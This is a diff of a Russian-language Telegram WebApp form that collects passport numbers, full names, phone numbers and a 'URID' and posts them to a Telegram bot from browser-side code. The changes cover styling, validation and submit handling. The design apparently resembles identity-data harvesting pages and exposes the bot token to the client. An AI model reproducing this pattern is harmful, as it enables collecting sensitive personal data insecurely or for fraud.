@@ -5,86 +5,118 @@
   <title>Предоставление данных</title>
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <style>
+    :root {
+      --bg-color: #fff;
+      --text-color: #000;
+      --input-bg: #fff;
+      --input-border: #ccc;
+      --input-focus-border: #0088cc;
+      --button-bg: #0088cc;
+      --button-bg-hover: #006fa1;
+      --button-text: #fff;
+    }
+
     body {
       margin: 0;
-      padding: 20px;
+      padding: 20px 16px 80px; /* padding-bottom для кнопки */
       font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+      background-color: var(--bg-color);
+      color: var(--text-color);
       min-height: 100vh;
-      background-color: var(--bg-color, #fff);
-      color: var(--text-color, #000);
       display: flex;
       flex-direction: column;
       align-items: center;
-      justify-content: flex-start;
-      transition: background-color 0.3s, color 0.3s;
     }
+
     h2 {
-      margin-bottom: 24px;
       font-weight: 600;
-      color: var(--text-color, #000);
+      margin-bottom: 24px;
     }
+
     form {
       width: 100%;
       max-width: 400px;
       display: flex;
       flex-direction: column;
-      gap: 28px;
-      /* Убираем фон и тени */
-      background: transparent;
-      box-shadow: none;
-      padding: 0;
+      gap: 24px;
     }
+
     .input-group {
       display: flex;
       flex-direction: column;
       position: relative;
     }
+
     label {
       font-weight: 600;
-      margin-bottom: 8px;
       font-size: 14px;
-      color: var(--text-color, #000);
+      margin-bottom: 6px;
+      color: var(--text-color);
+      user-select: none;
     }
+
     input {
-      border: none;
-      border-bottom: 2px solid var(--input-border-color, #999);
-      background: transparent;
-      padding: 6px 2px;
       font-size: 16px;
-      color: var(--text-color, #000);
-      outline: none;
-      transition: border-color 0.3s;
+      padding: 10px 12px;
+      border: 1.5px solid var(--input-border);
+      border-radius: 8px;
+      background-color: var(--input-bg);
+      color: var(--text-color);
+      outline-offset: 2px;
+      transition: border-color 0.3s ease, box-shadow 0.3s ease;
     }
+
     input::placeholder {
-      color: var(--input-placeholder-color, #999);
+      color: #999;
+      opacity: 1;
     }
+
     input:focus {
-      border-bottom-color: var(--button-color, #0088cc);
+      border-color: var(--input-focus-border);
+      box-shadow: 0 0 6px var(--input-focus-border);
     }
-    button {
-      padding: 12px;
-      background-color: var(--button-color, #0088cc);
-      color: var(--button-text-color, #fff);
+
+    input[readonly] {
+      background-color: #f9f9f9;
+      cursor: not-allowed;
+    }
+
+    button#submitBtn {
+      position: fixed;
+      bottom: 12px;
+      left: 50%;
+      transform: translateX(-50%);
+      width: calc(100% - 32px);
+      max-width: 400px;
+      padding: 14px 0;
+      font-size: 18px;
+      font-weight: 700;
+      background-color: var(--button-bg);
+      color: var(--button-text);
       border: none;
-      border-radius: 6px;
-      font-size: 16px;
+      border-radius: 10px;
       cursor: pointer;
-      font-weight: 600;
-      transition: background-color 0.3s;
+      box-shadow: 0 4px 8px rgb(0 136 204 / 0.4);
+      transition: background-color 0.3s ease;
+      z-index: 100;
     }
-    button:hover {
-      background-color: var(--button-hover-color, #006fa1);
+
+    button#submitBtn:hover {
+      background-color: var(--button-bg-hover);
     }
+
     .status {
       margin-top: 12px;
       font-weight: 600;
       font-size: 14px;
       min-height: 22px;
-      color: var(--text-color, #000);
+      color: var(--text-color);
     }
+
     .status.success {
       color: green;
     }
+
     .status.error {
       color: red;
     }
@@ -94,7 +126,7 @@
 
 <h2>Предоставление данных</h2>
 
-<form id="dataForm" autocomplete="off">
+<form id="dataForm" autocomplete="off" novalidate>
   <div class="input-group">
     <label for="passkey">Паспорт</label>
     <input
@@ -107,6 +139,9 @@
       inputmode="numeric"
       pattern="\d{4} \d{6}"
       title="Формат: 0000 000000"
+      autocomplete="off"
+      autocorrect="off"
+      spellcheck="false"
     />
   </div>
   <div class="input-group">
@@ -119,6 +154,7 @@
       required
       autocomplete="name"
       autocapitalize="words"
+      spellcheck="false"
     />
   </div>
   <div class="input-group">
@@ -132,6 +168,9 @@
       inputmode="tel"
       pattern="\+7\s?\d{3}\s?\d{3}\s?\d{2}\s?\d{2}"
       title="Введите номер в формате +7 999 999 99 99"
+      autocomplete="tel"
+      autocorrect="off"
+      spellcheck="false"
     />
   </div>
   <div class="input-group">
@@ -142,11 +181,14 @@
       name="urid"
       required
       autocomplete="off"
+      autocorrect="off"
+      spellcheck="false"
     />
   </div>
-  <button type="submit">Отправить</button>
   <div class="status" aria-live="polite"></div>
 </form>
+
+<button id="submitBtn" type="submit" form="dataForm">Отправить</button>
 
 <script>
   const tg = window.Telegram?.WebApp || null;
@@ -156,11 +198,12 @@
 
     root.style.setProperty('--bg-color', theme.bg_color || '#fff');
     root.style.setProperty('--text-color', theme.text_color || '#000');
-    root.style.setProperty('--button-color', theme.button_color || '#0088cc');
-    root.style.setProperty('--button-text-color', theme.button_text_color || '#fff');
-    root.style.setProperty('--button-hover-color', theme.button_hover_color || '#006fa1');
-    root.style.setProperty('--input-border-color', theme.input_border_color || '#999');
-    root.style.setProperty('--input-placeholder-color', theme.input_placeholder_color || '#999');
+    root.style.setProperty('--input-bg', theme.bg_color || '#fff');
+    root.style.setProperty('--input-border', theme.control_color || '#ccc');
+    root.style.setProperty('--input-focus-border', theme.button_color || '#0088cc');
+    root.style.setProperty('--button-bg', theme.button_color || '#0088cc');
+    root.style.setProperty('--button-bg-hover', theme.button_hover_color || '#006fa1' || '#006fa1');
+    root.style.setProperty('--button-text', theme.button_text_color || '#fff');
   }
 
   if (tg) {
@@ -183,6 +226,7 @@
 
   const form = document.getElementById('dataForm');
   const statusDiv = document.querySelector('.status');
+  const submitBtn = document.getElementById('submitBtn');
 
   form.addEventListener('submit', function (e) {
     e.preventDefault();
@@ -195,6 +239,28 @@
     if (!/^\d{4} \d{6}$/.test(passkey)) {
       statusDiv.textContent = 'Неверный формат паспорта. Пример: 1234 567890';
       statusDiv.className = 'status error';
+      passInput.focus();
+      return;
+    }
+
+    if (fio.length < 3) {
+      statusDiv.textContent = 'Пожалуйста, введите ФИО полностью.';
+      statusDiv.className = 'status error';
+      form.fio.focus();
+      return;
+    }
+
+    if (!/^\+7\s?\d{3}\s?\d{3}\s?\d{2}\s?\d{2}$/.test(phone)) {
+      statusDiv.textContent = 'Неверный формат номера телефона. Пример: +7 999 999 99 99';
+      statusDiv.className = 'status error';
+      form.phone.focus();
+      return;
+    }
+
+    if (urid.length < 3) {
+      statusDiv.textContent = 'Введите корректный URID.';
+      statusDiv.className = 'status error';
+      form.urid.focus();
       return;
     }
 
@@ -207,6 +273,10 @@
 ФИО: ${fio}
 Телефон: ${phone}
 URID: ${urid}`;
+
+    submitBtn.disabled = true;
+    statusDiv.textContent = 'Отправка данных...';
+    statusDiv.className = 'status';
 
     fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
       method: 'POST',
@@ -229,6 +299,9 @@ URID: ${urid}`;
       .catch(err => {
         statusDiv.textContent = 'Ошибка: ' + err.message;
         statusDiv.className = 'status error';
+      })
+      .finally(() => {
+        submitBtn.disabled = false;
       });
   });
 </script>
